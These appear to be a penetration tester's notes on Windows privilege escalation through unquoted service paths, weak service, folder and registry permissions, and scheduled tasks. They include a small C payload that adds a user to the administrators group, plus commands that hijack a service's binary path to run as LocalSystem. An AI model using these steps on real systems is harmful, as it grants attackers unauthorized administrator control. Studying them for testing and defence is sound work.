
binary to put in service.exe

```
 cat useradd.c
#include <stdlib.h> /* system, NULL, EXIT_FAILURE */
int main ()
{
 int i;
 i=system ("net localgroup administrators low /add");
 return 0;
}
```
 to compile
 
 `i686-w64-mingw32-gcc -o weakservice.exe useradd.c`



Services

Find services running with elevated privileges. Two main categories of vulnerabilities:
	- Weak service path
	- Weak permissions

. . .

Unquoted Service Path

If a privileged service is running and pointing to an unquoted service path with spaces, then Windows has to guess where the executable file is. It guesses in this order:

C:\Services\My | Spaced Directory\Service.exe
C:\Services\My Spaced | Directory\Service.exe
C:\Services\My Spaced Directory\Service.exe

It assumes that each space, from left to right, is the dividing point between the executable and the arguments passed to that executable. So to exploit this situation, you could create a malicious executable and place it at the location below:

C:\Services\My.exe

To find services with spaces and without quotes, run the following CMD command:
wmic service get name,startname,startmode,pathname | findstr /i /v "c:\windows" | findstr /v """
Or try this alternative using regex:
wmic service get name,startname,startmode,pathname | findstr /r /c:"\\.* .*exe" | findstr /v """

. . .

Weak Permissions Around Service
	- Folder permissions -- replace executable
	- Service permissions -- change executable path and executing account
	- Registry permissions -- same through registry

Folder Permissions
To check folder permissions:
accesschk.exe -dv <username> <folder>

To exploit, replace the executable with a malicious one

Service Permissions
To check service permissions:
accesschk.exe -cv <username> <service_name>

To check current service config:
sc qc <service_name>

To modify service config:
sc config <service_name> binPath= "c:\path\to\malicious" obj= LocalSystem

Registry Permissions
Open regedit and navigate to:
Computer\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\<service_name>

. . .

Scheduled Tasks

List scheduled tasks that aren't running as the current user:
get-scheduledtask | select * | where {$_.principal.userid -notlike "*$env:username*"} | format-table -property @{expression={$_.principal.userid}},taskpath,taskname,date

See what files are executed by a task (PowerShell):
$task = get-scheduledtask -taskname <task_name>
foreach ( $action in $task.actions ) { echo $action.execute }

Check permissions on those files:
accesschk.exe -v <username> <file>

If readable, then see what the executable is doing.
If writable, then replace with malicious.

. . .
